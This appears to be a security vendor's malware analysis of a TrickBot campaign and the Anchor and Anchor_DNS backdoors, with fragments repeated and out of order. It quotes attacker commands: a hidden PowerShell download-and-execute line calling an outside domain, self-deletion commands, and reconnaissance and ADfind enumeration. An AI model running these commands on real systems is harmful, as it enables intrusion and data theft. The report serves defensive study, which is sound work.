DNS.\nHowever, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.\n\nEarliest Anchor sample observed (SHA-1:3ed09498214d93c9ec14a15286546d242ad58943)\n\nPDB path for the earliest Anchor sample found.\n\nMany Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this\nmalware.\n\n\n\n19/25\n\nList of Anchor payloads found on VirusTotal with 0/0 detection rate.\n\nThe malware has both x86 and x64 versions and contains an installer component to install the malware.\n\nPayload Name Hash PDB Path\n\nanchorInstaller_x86 3ed09498214d93c9ec14a15286546d242ad58943\n\n4bba60ff11f8b150b004960c658ad74a707ebcea\n\nD:\\MyProjects\\secondWork\\Anchor\\Win32\\Release\\anchorInstaller_x86\n\nC:\\Users\\ProFi\\Desktop\\data\\Win32\\anchorInstaller_x86Code\\anchorIn\n\nanchorInstaller_x64 e75983b073ff0632e35e237f6622466c2699687c  \n\nAnchor_x86 Bd26238fb7d7e16ea79073d882bba00d34dd859c\n\nF3683a0c12154e8bf44d9d942db3eac9e930e7a5\n\n9ebb541dcb24d564448a6f5e00c613b73eba7148\n\nD:\\MyProjects\\secondWork\\Anchor\\Win32\\Release\\Anchor_x86.pdb\n\nC:\\Users\\ProFi\\Desktop\\data\\Win32\\anchorInstaller_x86Code\\Anchor_\n\nD:\\Anchor\\Anchor\\Win32\\Release\\Anchor_x86.pdb\n\nAnchor_x64 46c595e580719a4c54f55b4041f81d6e50ab4062\n\ne5dc7c8bfa285b61dda1618f0ade9c256be75d1a\n\nD:\\Anchor\\x64\\Debug\\Anchor_x64.pdb\n\n \nC:\\[JOB]\\Anchor\\x64\\Release\\Anchor_x64.pdb\n\nThe Anchor payload is delivered by AnchorInstaller AnchorInstaller unpacks the Anchor DLL and drops it in the %SYSTEMROOT% or\n%SYSTEMROOT%\\System32 folder. The dropped DLL is loaded by the service netTcpSvc, which is created by the malware.\n\nAnchor service persistence found in the registry.\n\nNTFS ADS File - Storing the GUID\n\nSimilar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:\n\n\n\n20/25\n\nAnchor GUID stored as an NTFS ADS.\n\nUnlike Anchor_DNS, which stores the information in Base64, Anchor’s GUID is saved in cleartext.\n\nSelf Deletion\n\nAnchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the\ndropper is deleted once the malware was successfully deployed:\n\ncmd.exe /c timeout 1 && del C:\\Users\\[USER]\\[SAMPLE_LOCATION]\"\ncmd.exe /C PowerShell 'Start-Sleep 5; Remove-Item C:\\Users\\[USER]\\[SAMPLE_LOCATION]'\n\nC2 Communication\n\nSimilar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2\nservers. It uses the following hardcoded web services to test connectivity:\n\nOnce it has established connectivity, it communicates with a set of hardcoded C2 servers.\n\nCommunication with a set of hardcoded C2 servers.\n\nThe request and response follow the same C2 communication format as TrickBot.\n\nhttp://malware-traffic-analysis.net/2019/10/02/index.html\n\n\n21/25\n\nThe request and response format for Anchor.\n\nConnecting Anchor / Anchor_DNS to TrickBot\n\nAnchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads. There are\nalso several other similarities noted below.\n\nGUID Generation Function\n\nThe GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot. The GUID\nfollows this pattern:\n\n[Machine_NAME]_[Windows_Version].[Client_ID]\n\nMalware Name GUID\n\nAnchor_DNS /anchor_dns/MACHINE-001_W617601.D4CB942AA18EFF519DCBCAE88A0A99FB/\n\nAnchor /anchor001/jujubox-PC_W617601.6E8516CA48318FB2904E2027B5350B26\n\nTrickbot /mor49/DAVID-PC_W10017134.55C60B5D13499341D72F5A34C632CFD9\n\nExternal IP Check Web Services\n\nBoth Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the\nexternal IP of the infected machine. The same list is also used by TrickBot:\n\ncheckip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, and ip.anysrc.net.\n\nIn certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.\n\nShared C2 Infrastructure\n\nTrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure. However, in some instances of this attack, there was C2 server\noverlap between these infrastructures. For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served\nAnchor_DNS and TrickBot:\n\nAnchor sample with hardcoded IP (SHA-1: 9ebb541dcb24d564448a6f5e00c613b73eba7148)\n\nConnection to TrickBot\n\nThis above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker,\nand Mimikatz.\n\nConnection to Anchor_DNS\n\nThe same IP resolved to a domain previously used by Anchor_DNS, chishir[.]com.\n\nhttps://www.fortinet.com/blog/threat-research/new-trickbot-plugin-harvests-email-addresses-from-sql-servers-screenlocker-module-not-for-ransom.html\nhttps://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns\n\n\n22/25\n\nPassive DNS information of 23.95.97[.]59 , taken from VirusTotal.\n\nComparison Between Anchor Malware Family\n\nThe following table gives a comparison between different malware in the Anchor malware family.\n\nFeatures Anchor Old Anchor_DNS New Anchor_DNS\n\nEarliest Observed Sample August 2018 May 2019 November 2019\n\nCommand-line arguments? - + +\n\nSelf-Deletion + + -\n\nNetwork Connectivity check via ICMP - - +\n\nNetwork Connectivity check via web services + + -\n\nNTFS ADS files + + +\n\nTrickBot’s GUID Generation pattern +\n\n(Cleartext)\n\n+\n\n(base64)\n\n+\n\n(base64)\n\nCode Obfuscation Very Little Very Little Obfuscated Code\n\nC2 Communication Protocols HTTP(S) DNS ICMP, DNS\n\nRise of Signed Malware\n\nCode signing is meant to provide a level of credibility and integrity to a binary from the developer, and to guarantee that the binary has not\nbeen tampered with. In the past, signing malware was a practice mostly seen with nation-state threat actors. However, this is no longer the\ncase. Nowadays, more and more commodity malware are being signed with valid certificates, effectively bypassing some security solutions\nthat grant trust to signed binaries.\n\nMalicious files in this attack were signed by:\n\nBiller FIN Oy\nNIRMAL 0013 Limited\nBRO-BURGER, LLC\n\nTrickBot payloads and Anchor / Anchor_DNS payloads were at times signed by the same signer, which further demonstrate that these\nmalware are most likely used by the same threat actor.\n\nIn searching for additional signed known and unknown files, we were able to identify dozens of malware samples signed by the same\norganizations. Some were also signed with the same serial number.\n\n1.

These attacks start with a TrickBot infection and, with high-profile targets, can escalate to a hacking operation\nleveraging a new malware, Anchor, and a new variant of Anchor_DNS.\n\nUnlike previously reported TrickBot attacks that resulted in mass ransomware infections, these new attacks focus on stealing sensitive\ninformation from POS systems and other sensitive resources in the victims’ network by compromising critical assets.\n\nIn addition, Cybereason discovered a previously undocumented malware called Anchor as well as a new variant of the recently discovered\nAnchor_DNS malware. Both Anchor and Anchor_DNS are directly related to TrickBot infections and have code similarities, and sometimes\nalso share C2 infrastructure with TrickBot. Anchor_DNS uses various techniques to keep itself under-the-radar, such as communication over\nDNS, and the reliance on specific command-line arguments in order to run properly. Through these techniques, it is able to evade many\nsecurity products including certain sandboxes and AV vendors.\n\nThese attacks stress the danger of commodity malware infections that sometimes may be underestimated due to their frequent use and high\nvolume. It is important to note that, in this attack, once an endpoint is infected with TrickBot it is up to the attackers to decide their next move. If\nthey identify a high-value target, they can go beyond the traditional information stealing capabilities of TrickBot and use the target machine as\nan entry point to other machines on the network.\n\nThis research does not focus on the attribution of these attacks. However, through analysis of the evidence and context presented in our\nresearch, we noticed certain TTP overlaps  with earlier attacks that were attributed  to the financially-motivated FIN6 threat actor. We leave it to\nour readers to draw their own conclusions on the attribution of these attacks.\n\nLastly, these attacks show how threat actors are shifting toward signed malware more than ever before. As this trend continues to evolve,\nsecurity practitioners and security vendors must improve the detection of signed malware and re-think the trust given to signed binaries in\ngeneral.\n\nThe best way to defend against an attack like this is to use an iterative security process.

Similar to attacks previously reported by Cybereason, this campaign started with a TrickBot infection and progressed into a\nhacking operation targeting sensitive financial systems.\n\nHowever, unlike previous operations that focused on causing a massive ransomware infection (Ryuk and LockerGoga) by compromising critical\nassets like the domain controller, this new operation is focused on targeting point of sale (PoS) systems. The campaign leverages a newly\ndiscovered malware family called Anchor exclusively for high-profile targets.\n\nLearn more about additional attacks that leverage TrickBot.\n\nThis research focuses on the following aspects of the TrickBot-Anchor attack:\n\n1. Anatomy of the Attack: A step-by-step anatomy of the attacks, including infection vectors and a dissection of the tools and\ntechniques used by the attackers.\n\n2. New Malware: The discovery of a new malware family called Anchor, which includes the Anchor_DNS and a new,\nundocumented Anchor that has been operating since August 2018 (and potentially even earlier). The Anchor malware is a backdoor used\nvery selectively on high-profile targets, and appears to be tightly connected to TrickBot, potentially even authored by the same individuals\nwho created TrickBot.\n\nWhile this blog does not discuss attribution explicitly, the nature of these attacks, specifically the motivation, some of the tools and techniques\ndetailed,  have certain resemblance to past attacks that were linked to the financially-motivated FIN6 threat actor, a group that is known to\ntarget POS systems and has been linked to TrickBot infections in the past.\n\nLastly, our blog emphasizes the gravity and danger that lies in commodity malware infections, as they have the potential of escalating into a\nhacking operation. This can easily lead to a disastrous outcome, whether it be a ransomware infection or theft of sensitive financial data.\n\nKey Points\n\nThe TrickBot-Anchor Operation: Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing,\nand retail businesses across the United States and Europe.\nTargets POS Systems: The attacks target POS systems to steal sensitive information by taking over critical assets in the victims’\nnetwork.\nDeploys A Backdoor on High-value Targets: On certain high-profile targets, the attackers selectively use a new variant of the rare\nAnchor_DNS tool. Anchor_DNS is a backdoor that uses the DNS protocol to stealthily communicate with C2 servers.\nUses a New, Undocumented Malware: In addition to the new Anchor_DNS variant, the attackers use a completely new and\npreviously undocumented malware dubbed Anchor. Anchor has been in operation since August 2018 and appears to be tightly related to\nTrickBot.\nAdds Enhancements to TrickBot: This attack adds a new and enhanced stealing module to TrickBot that focuses on stealing\npasswords from various products, including the KeePass password manager.\nUses Known Tools for Reconnaissance and Lateral Movement: The majority of the initial interactive hacking operation uses the\nknown tools Meterpreter, PowerShell Empire, and Cobalt Strike for reconnaissance and lateral movement.\nAbuses the Trust of Certificate Authorities: Many of the payloads in the attacks are signed binaries, which demonstrates the ever-\ngrowing trend of signed threats that abuse the trust of certificate authorities to bypass detection.\n\nTable of Contents\n\nAnatomy of the Attack: A Step-by-Step Analysis\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware\nhttps://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware\nhttps://attack.mitre.org/software/S0266/\nhttps://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware\nhttps://www.fortinet.com/blog/threat-research/lockergoga-ransomeware-targeting-critical-infrastructure.html\nhttps://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware\nhttps://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns\nhttps://attack.mitre.org/groups/G0037/\nhttps://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf\nhttps://www.zdnet.com/article/cybercrime-group-fin6-evolves-from-pos-malware-to-ransomware/\nhttps://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns\nhttps://keepass.info/\nhttps://github.com/rapid7/metasploit-framework/wiki/Meterpreter\nhttps://github.com/EmpireProject/Empire\nhttps://www.cobaltstrike.com/\nhttps://medium.com/@chroniclesec/abusing-code-signing-for-profit-ef80a37b50f4\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 2/23\n\nAn overview of the attack tree, as seen in the Cybereason Defense Platform.\n\nInfection Vector\n\nDownloading and injecting TrickBot.\n\nThe attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named “Annual Bonus Report.doc”. When\nthe user clicks on the link, the TrickBot dropper downloads onto the target machine. This differs from previous TrickBot attacks we have seen,\nwhere TrickBot is usually dropped through a Microsoft Office document or by another malware like Emotet.\n\nPhishing email that tricks the user into downloading TrickBot.\n\nThe TrickBot Downloader\n\nThe campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document. When the user double-\nclicks the file, they are presented with a decoy message box. To avoid suspicion, the decoy message suggests the user should update Microsoft\nWord or open the file from another computer.\n\nhttps://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 3/23\n\nTrickBot displays a message box suggests updating Microsoft Word or opening the file on another computer to preview the document.\n\nWhile at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are not\nassociated with Microsoft Word, nor are they Microsoft Word document files.\n\nMost of the initial payloads in these campaigns are signed with valid certificates to evade security tools. They abuse the relative trust that is given\nto signed binaries to avoid detection.\n\nFile metadata properties for the fake Microsoft Word Document.\n\nSigned malware is an evasive initial entry point into an organization.\n\nThe message box distracts the user as TrickBot’s payload is downloaded, stored in the %TEMP% folder, and executed. A new process injects the\nTrickBot payload into a svchost.exe process.\n\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 4/23\n\nsvchost.exe injected code malicious evidence as seen in the Cybereason Platform.\n\nDomain associated with the TrickBot payload download.\n\nThe TrickBot Payload\n\nOnce TrickBot’s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected\nendpoint and the network. This information is crucial, as it determines the course of the attack.\n\nChecking Network Connectivity\n\nTrickBot checks for Internet connectivity by trying to access several designated domains. These domains are preconfigured and belong to\nlegitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com,\nwtfismyip.com, ip.anysrc.net.\n\nOnce TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains. It collects and\nsends information about where the target machine is located to the C2 servers.\n\nBrowser History and Credential Theft\n\nAfter TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity. The\nmodule core-parser.dll is reflectively loaded into svchost.exe. core-parser.dll parses the TrickBot config files and extracts IP addresses for\nsecondary C2 communication, redirection, and web injection logic.\n\nhttps://www.fortinet.com/blog/threat-research/deep-analysis-of-trickbot-new-module-pwgrab.html\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 5/23\n\ncore-parser.dll injected into svchost.dll.\n\nTrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server. The C2 server is responsible for handling the\nstolen data.\n\nA list of C2 servers extracted from TrickBot’s configuration.\n\nTrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique\n(LOLBin).\n\nesentutl /p /o C:\\Users\\[USER]\\AppData\\Local\\Temp\\grabber_temp.edb\n\nThis command dumps the Extensible Storage Engine (ESE) database format.\n\nApplication-specific Credential Theft\n\nThis variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager. TrickBot's\nKeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed PoshKPBrute, a script that\nperforms a dictionary attack against KeePass .kdbx files. Once it finds the dictionary key, it dumps all passwords as an output and sends the\nattackers the master password.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875546(v%3Dws.11)\nhttps://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\nhttps://keepass.info/\nhttps://github.com/wevans311082/PoshKPBrute\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 6/23\n\nKeePass stealing brute force tool.\n\nTrickBot’s stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.\n\nTrickBot attempting to steal keys from Filezilla, OpenSSH, and OpenVPN.\n\nReconnaissance Commands\n\nIn addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including\nnltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe. They gather information on:\n\nAll trusted domains, domains, and domain controllers\nA list of computers and network devices on the network\nThe infected machine user and groups the user belongs to\nThe infected machine, including machine name, operating system, workstation domain, and more information\nNetwork adapters that have connected to the machine and DNS servers\n\nhttps://filezilla-project.org/\nhttps://www.openssh.com/\nhttps://openvpn.net/\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 7/23\n\nThe net.exe process tree.\n\nNltest / domain_trusts /all_trusts\n\nNet view /all\n\nNltest /domain_trusts\n\nNet view /all /domain\n\nIpconfig /all\n\nNet config workstation\n\nNslookup “-q=srv_kerberos._tcp”\n\n/c “start microsoft-edge:http://127.0.0.1:52715/11984”\n\nReconnaissance commands launched by TrickBot.\n\nThe attacker also uses PowerShell to test DNS entry settings. They use the command -q=srv_kerberos_tcp on the process nslookup.exe to\nopen an interactive shell. They use the shell to expand their search to other machines on the network by searching for things like a list of the\ndomain controllers.\n\nTrickBot testing DNS settings.\n\nWith this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.\n\nFrom TrickBot Infection to Interactive Hacking\n\nThe threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target. If so, they\nescalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the mass\ndeployment of ransomware across endpoints connected to the domain controller.\n\nPowerShell Payloads\n\nThe threat actor leverages PowerShell to send additional payloads to the target machine. They issue commands to fetch a payload from a\nsecondary server and, once it’s downloaded, immediately execute it on the target machine through PowerShell.\n\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 8/23\n\npowershell.exe -nop -WindowStyle Hidden -executionpolicy bypass -c \"IEX ((new-object\nnet.webclient).downloadstring('hxxps://northracing[.]net/?a=irs&x=[base64]'))\"\n\nThe northracing[.]net URL contains a PowerShell script in the contents of the webpage. Though we were unable to fetch the script used in this\nspecific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for\nsimilar activity. The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see\nif it should continue its operation. If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously\nPOSTs data to the same domain the payload was fetched from. Each POST request is sent along with a UUID generated from the user’s\nhostname and the current process ID.\n\nInformation sent along each POST request in the payload.\n\nA POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file\nsystem, and information about the operating system.\n\nhttps://any.run/report/daf223b923f335c3de66cae8a091063361262669c8f9acaf59a352b1e0e07b8c/b92f9889-00f9-429d-97e4-fb149cfe66db\nhttps://app.any.run/tasks/b92f9889-00f9-429d-97e4-fb149cfe66db/\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 9/23\n\nThe PowerShell payloads using WMI to probe for system information.\n\nThis information is sent to the C2 along with the `i` parameter. When a response is received, the payload checks to see if the response matches\nthe value cex01. If it does, the PowerShell script stops executing and kills the task. If the response is any other value, the script sets a timeout\nvariable based on the response and continues to the main loop.\n\nThis indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.\n\nThe main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.\n\nThe main loop that sends a POST request to the server.\n\nEach line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using\nPowerShell through the Invoke-Expression (IEX) commandlet. The output of the command is sent back to the C2 server using a POST request\nwith the “a” parameter.\n\nMeterpreter & Cobalt Strike Implants\n\nThe attack tree demonstrating the beginning of the hacking operation using Meterpreter.\n\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 10/23\n\nMeterpreter Implant\n\nThe attackers use a Meterpreter implant to carry out post-exploitation actions. The Cybereason Platform detects both the shellcode and various\nMeterpreter DLLs reflectively loaded to memory. The detected DLLs include:\n\nMetsrv.dll: For Meterpreter, where the protocol and extension systems are implemented\nExt_server_priv.x86.dll: For privilege escalation\nExt_server_stdapi.x86.dll: A metasploit post exploitation module used for reconnaissance\n\nCybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.\n\nExamining the loaded modules shows which Metasploit modules are loaded.\n\nThe Meterpreter agent creates a connection to port 4444 on the external IP address 91.12.89[.]129.\n\nCobalt Strike Implant\n\nUsing Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.\n\nAttackers injecting Cobalt Strike and other Metasploit payloads into the rundll32.exe process.\n\nhttps://github.com/rapid7/metasploit-framework/wiki/Meterpreter\nhttps://www.cobaltstrike.com/\nhttps://www.metasploit.com/\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 11/23\n\nDetection of Cobalt Strike, Meterpreter, and shellcode execution.\n\nThe attacker uses the following metasploit modules:\n\next_server_extapi.x86.dll: Obtains clipboard data and manipulates and decrypts the NTDS file\next_server_priv.x86.dll: Performs privilege escalation\nExt_server_stdapi.x86.dll: Performs reconnaissance activity\nBypassuac.x64.dll: A post-exploitation module used to bypass User Account Control\n\nPost-exploitation modules reflectively loaded to rundll32.exe\n\nThe connection to the external IP address 199.217.115[.]53 on port 8443.\n\nBoth Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the\nFIN6 threat actor.\n\nActive Directory Discovery using Cobalt Strike\n\nThe threat actor uses known Cobalt Strike modules to enumerate Active Directory information:\n\nhttps://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Invoke-DACheck.ps1\n\nhttps://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/\nhttps://attack.mitre.org/groups/G0037/\nhttps://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Invoke-DACheck.ps1\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 12/23\n\nhttps://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Initial-LAdminCheck.cna\n\nThe attackers execute several Base64-encoded PowerShell commands in order to determine if the infected machine’s user is in the admin or\ndomain admin group.\n\nAfter verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional\nBase64-encoded and compressed PowerShell command.\n\nThe obfuscated and compressed PowerShell command.\n\nThe decoded PowerShell command that attempts to gather domain controller information.\n\nActive Directory Discovery using ADfind\n\nThe attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.\n\nadfind.exe -f \"(objectcategory=organizationalUnit)\"\n\nadfind.exe -gcb -sc trustdmp\n\nadfind.exe -f \"objectcategory=computer\"\n\nadfind.exe -sc trustdmp\n\nadfind.exe -f \"(objectcategory=person)\"\n\nadfind.exe -subnets -f (objectCategory=subnet)\n\nadfind.exe -f \"(objectcategory=group)\"\n\nThe ADfind tool has reportedly been used previously in attacks related to FIN6.\n\nNew Anchor_DNS Variant Discovered\n\nOne of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT\nSecurity. It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2\nservers. Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\\\n\nOldest Anchor_DNS sample observed, SHA-1: b388243bf5899c99091ac2df13339f141659bbd4\n\nThis new variant acts as a sophisticated, stealthy backdoor that selectively chooses high-profile targets. Anchor_DNS is still undergoing rapid\ndevelopment cycles with code changes and new feature updates every few weeks.\n\nThis is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:\n\nNo self-deletion mechanism shown in previous samples\nNo internet connectivity checks using legitimate online web services\nA built-in capability to check for C2 availability using ICMP (ping)\nAdditional partial string encryption and code obfuscation\n\nhttps://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Initial-LAdminCheck.cna\nhttp://www.joeware.net/freetools/tools/adfind/\nhttps://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\nhttps://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 13/23\n\nStatic Analysis Observations\n\nFile name SHA-1\n\nanchorDNS_x64.exe 5f1ad1787106de9725005d8da33d815d0994ee83\n\nanchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS. This file is the 64-bit version of Anchor_DNS, however,\nthere were earlier instances of the 32-bit version as well. The project name shows that this is the fifth version of Anchor_DNS.\n\n`PDB PATH: C:\\simsim\\anchorDNS.v5\\Bin\\x64\\Release\\anchorDNS_x64.pdb\n\nMany strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native\nenglish speakers.\n\nMultiple typos and grammatical mistakes in the Anchor_DNS code.\n\nThe threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by\nimplementing a packer. The following example shows considerable changes in the code of the WinMain() function between an older variant of\nAnchor_DNS and the new variant.\n\n \n\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 14/23\n\nAnchor_DNS was able to stay under-the-radar by using specific execution flags.

However, the newer version described here does not check Internet\nconnectivity using legitimate online web services like ipinfo.io, and instead uses a built-in capability to check for the server’s availability using\nthe ICMP protocol.\n\nDetermining C2 server connectivity.\n\nDNS Tunneling\n\nAnchor_DNS communicates with the C2 servers over DNS using DNS Tunneling. With this technique, Anchor_DNS can transfer data, receive\ncommands, and download an additional payload, as detailed in NTT Security’s report on an older Anchor_DNS sample.\n\nBy implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS\ntraffic.\n\nhttps://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152\nhttps://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 16/23\n\nExample of DNS Tunneling traffic generated by Anchor_DNS.\n\nDiscovery of The Anchor Malware and Its Connection to TrickBot\n\nDuring our investigation, we found several unidentified malware samples related to TrickBot infections. The malware is dubbed Anchor by its\nauthors and has been active since August 2018. Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS.\nHowever, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.\n\nEarliest Anchor sample observed (SHA-1:3ed09498214d93c9ec14a15286546d242ad58943)\n\nPDB path for the earliest Anchor sample found.\n\nMany Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this malware.\n\n\n\n9/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware\n\nhttps://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 17/23\n\nList of Anchor payloads found on VirusTotal with 0/0 detection rate.\n\nThe malware has both x86 and x64 versions and contains an installer component to install the malware.\n\nPayload\nName\n\nHash PDB Path\n\nanchorIn-\nstaller_x86\n\n3ed09498214d93c9ec14a15286546d242ad58943\n\n4bba60ff11f8b150b004960c658ad74a707ebcea\n\nD:\\MyProjects\\secondWork\\Anchor\\Win32\\Release\\anchorInstaller_x86.pdb\n\nC:\\Users\\ProFi\\Desktop\\data\\Win32\\anchorInstaller_x86Code\\anchorInstaller_x86.pdb\n\nanchorIn-\nstaller_x64\n\ne75983b073ff0632e35e237f6622466c2699687c  